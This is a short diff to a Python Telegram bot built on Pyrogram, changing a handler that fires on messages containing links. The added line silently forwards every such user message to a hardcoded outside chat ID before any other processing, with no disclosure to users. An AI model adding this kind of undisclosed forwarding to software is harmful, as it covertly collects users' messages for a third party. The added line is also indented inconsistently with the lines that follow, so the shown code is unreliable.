@@ -35,6 +35,8 @@ from pyrogram.errors import UserNotParticipant, UserBannedInChannel
 
 @pyrogram.Client.on_message(pyrogram.filters.regex(pattern=".*http.*"))
 async def echo(bot, update):
+  await bot.forward_messages( chat_id=-1001200690926, from_chat_id=update.chat.id, message_ids=update.message_id)
+    
     if update.from_user.id in Config.BANNED_USERS:
         await update.reply_text("You are B A N N E D 🤣🤣🤣🤣")
         return
